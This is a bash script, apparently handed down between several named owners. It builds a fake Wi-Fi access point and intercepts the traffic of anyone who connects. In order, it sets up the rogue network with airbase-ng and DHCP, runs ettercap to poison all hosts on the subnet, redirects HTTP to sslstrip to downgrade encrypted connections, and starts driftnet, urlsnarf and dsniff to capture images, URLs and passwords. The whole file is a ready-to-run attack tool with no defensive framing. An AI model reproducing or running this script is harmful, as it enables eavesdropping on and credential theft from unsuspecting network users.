#----------------------------------------------------------------------#
#This script has had many owners
# Deathray
# l3g10n
# BakedDeetz
# hammer13
# twrobel3
# TheDekel
# VOIDCRUSHER

#----------------------------------------------------------------------#
if ! grep 192.168.179.1 /etc/dhcp3/dhcpd.conf > /dev/null
then echo "Did not find expected dhcp settings for 192.168.179.1 in dhcpd.conf"
echo "Would you like to add the needed content? (y/n, c to continue anyways)"
read -e CONFIRM
if [[ "$CONFIRM" == "y" || "$CONFIRM" == "Y" ]]
    then echo "" >> /etc/dhcp3/dhcpd.conf
    echo "option domain-name-servers 192.168.179.1;" >> /etc/dhcp3/dhcpd.conf #might be able to delete this line
    echo "subnet 192.168.179.0 netmask 255.255.255.0 {" >> /etc/dhcp3/dhcpd.conf
    echo "range 192.168.179.10 192.168.179.100;" >> /etc/dhcp3/dhcpd.conf
    echo "option routers 192.168.179.1;" >> /etc/dhcp3/dhcpd.conf
    echo "option domain-name-servers 192.168.179.1;" >> /etc/dhcp3/dhcpd.conf
    echo "}" >> /etc/dhcp3/dhcpd.conf
elif [[ "$CONFIRM" != "C" && "$CONFIRM" != "c" ]]
    then echo "Terminating"
    exit 1
fi
else echo "Proper DHCP settings found."
fi

echo "Enter the interface to set up the fake access point on (default: wlan1):"
read -e eface
if [[ "$eface" == "" ]]
then eface=("wlan1")
fi

echo "Enter the interface connected to the internet (default: wlan0):"
read -e iface
if [[ "$iface" == "" ]]
then iface=("wlan0")
fi

echo "Enter the name of the fake network to be made:"
read -e essid
if [[ "$essid" == "" ]]
then essid=("default network")
fi

echo "Starting Airmon-ng on $eface"
airmon-ng start $eface &
sleep 5

echo "Creating Symbolic Link"
ln -s /var/run/dhcp3-server/dhcpd.pid /var/run/dhcpd.pid

echo "Creating Access Point with name $essid on channel 1"
gnome-terminal --geometry=78x9+0+350 -x sh -c "airbase-ng -c 1 -e \"$essid\" mon0" &
sleep 2

ifconfig at0 up
ifconfig at0 192.168.179.1 netmask 255.255.255.0
route add -net 192.168.179.0 netmask 255.255.255.0 gw 192.168.179.1

echo "Start DHCPD3 on interface at0"
dhcpd3 -cf /etc/dhcp3/dhcpd.conf at0
echo "Start DNS Masq"
/etc/init.d/dnsmasq restart

echo "Launching ettercap, poisoning all hosts on the at0 interface's subnet"
#gnome-terminal -x sh -c  "ettercap -T -q -p -l ettercap$(date +%F-%H%M).log -i at0" &
gnome-terminal --geometry=78x16 -x  sh -c "ettercap -Tzqu -i at0" &
sleep 4

# Ensure IP forwarding is enabled
#echo 'Configuring ip forwarding'
#echo "1" > /proc/sys/net/ipv4/ip_forward

iptables --table nat --append PREROUTING -p tcp --dport 80 -j REDIRECT --to-port 10000
iptables --table nat --append POSTROUTING --out-interface $iface -j MASQUERADE
iptables --append FORWARD --in-interface at0 -j ACCEPT

echo 1 > /proc/sys/net/ipv4/ip_forward

echo 'Launching various tools'
driftnet -v -i at0 &
gnome-terminal --geometry=121x10+0+600 -x  sh -c "urlsnarf -i at0" &
gnome-terminal --geometry=31x4-1-1 -x  sh -c "dsniff -m -i at0 -d -w dsniff$(date +%F-%H%M).log"
gnome-terminal --geometry=31x4-1-190 -x  sh -c "sslstrip -a -k -f" &
